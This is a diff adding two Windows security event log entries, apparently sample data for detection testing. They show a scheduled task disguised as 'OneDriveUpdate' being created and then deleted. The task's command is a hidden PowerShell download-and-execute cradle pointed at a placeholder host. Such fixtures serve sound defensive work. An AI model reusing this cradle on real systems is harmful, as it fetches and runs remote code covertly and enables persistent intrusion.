@@ -1,0 +1,3 @@
+{"@timestamp":"2026-01-01T00:07:10Z","EventID":4698,"TaskName":"\\UserTask\\OneDriveUpdate","TaskContent":"<Command>powershell.exe -WindowStyle Hidden -c IEX(New-Object Net.WebClient).DownloadString('http://example')</Command>","SubjectUserName":"alice"}
+{"@timestamp":"2026-01-01T00:07:11Z","EventID":4699,"TaskName":"\\UserTask\\OneDriveUpdate","SubjectUserName":"alice"}
+
